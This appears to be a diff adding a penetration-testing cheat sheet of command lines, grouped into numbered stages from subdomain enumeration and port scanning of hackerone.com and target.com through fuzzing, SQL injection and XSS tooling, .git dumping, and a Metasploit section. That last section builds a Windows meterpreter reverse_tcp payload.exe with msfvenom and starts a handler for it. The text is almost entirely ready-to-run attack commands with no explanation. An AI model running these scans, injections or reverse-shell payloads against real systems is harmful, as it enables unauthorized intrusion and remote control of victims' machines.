@@ -1,0 +1,120 @@
+1. PASSIVE SUBDOMAIN ENUMERATION
+# subfinder (fastest passive)
+subfinder -d hackerone.com -all -o subs1.txt
+
+# amass (deep passive)
+amass enum -passive -d hackerone.com -o subs2.txt
+
+# assetfinder (lightweight)
+assetfinder --subs-only hackerone.com > subs3.txt
+
+# findomain (certificate transparency)
+findomain -t hackerone.com -q
+
+# sublist3r (search engines)
+sublist3r -d hackerone.com -o subs4.txt
+
+# theHarvester (OSINT)
+cd ~/theHarvester && PYTHONPATH=. python3 -m theHarvester -d hackerone.com -b bing,google -f subs5.txt
+2. ACTIVE DNS ENUMERATION
+# dnsrecon (bruteforce + zone transfer)
+dnsrecon -d hackerone.com -D /usr/share/wordlists/dnsmap.txt -t std,brt,crt
+
+# massdns (ultra-fast resolution)
+massdns -r resolvers.txt -t A subs.txt -o S
+
+# puredns (wildcard filtering)
+puredns resolve subs.txt -r resolvers.txt
+puredns brute-force /usr/share/wordlists/dnsmap.txt hackerone.com
+3. LIVE HOST VERIFICATION
+# httpx (HTTP probing)
+httpx -l all_subs.txt -title -tech -status-code -ip
+
+# nmap (full port scan)
+nmap -iL live.txt -sV -sC -oA nmap-full
+
+# masscan (fast port scan)
+masscan live.txt -p80,443,8080 --rate=10000
+4. VISUAL RECON
+# eyewitness (screenshots)
+eyewitness -f live.txt --all-protocols
+
+# aquatone (visual recon)
+aquatone-discover -d hackerone.com
+aquatone-scan live.txt
+5. SUBDOMAIN TAKEOVER
+# knockpy
+knockpy -f live.txt
+
+# subjack
+subjack -w live.txt -t 100 -c 50 -v
+6. URL & PARAMETER DISCOVERY
+# gauplus (Wayback + CommonCrawl)
+gauplus hackerone.com
+
+# waybackurls
+waybackurls hackerone.com
+
+# katana (crawler)
+katana -u live.txt -jc -silent
+
+# hakrawler
+hakrawler -d hackerone.com -depth 3 -plain
+
+# paramspider
+paramspider -d hackerone.com
+7. FUZZING & PARAMETER ANALYSIS
+# ffuf (directory fuzzing)
+ffuf -w wordlist.txt -u http://target.com/FUZZ -fc 404
+
+# arjun (parameter discovery)
+arjun -i urls.txt -t 100
+
+# linkfinder (JS analysis)
+linkfinder -i https://target.com/main.js -o cli
+
+# gf (pattern matching)
+gf xss sqli lfi rce urls.txt
+8. VULNERABILITY SCANNING
+# nikto (web server scanner)
+nikto -h live.txt -o nikto.txt
+
+# cmseek (CMS detection)
+cmseek -u live.txt
+
+# wafwoof (WAF detection)
+wafwoof live.txt
+
+# s3scanner (S3 buckets)
+s3scanner -bucket hackerone.com
+9. EXPLOITATION
+# dalfox (XSS)
+dalfox file params.txt
+
+# xssstrike
+xssstrike -u "http://target.com/?q=test"
+
+# sqlmap
+sqlmap -m params.txt --batch --risk=3 --level=5
+
+# lfisuite
+lfisuite -f params.txt
+
+# gitdumper
+gitdumper https://target.com/.git/ output/
+10. METASPLOIT
+# msfvenom (payload generation)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > payload.exe
+
+# msfconsole (handler)
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST your_ip; set LPORT 4444; run"
+11. MUTATION TOOLS
+# dnsgen (smart mutations)
+cat live.txt | dnsgen -
+
+# altdns (pattern mutations)
+altdns -i subs.txt -o perms.txt -w words.txt -r
+
+# gotator (fast permutations)
+gotator -sub subs.txt -perm words.txt
+
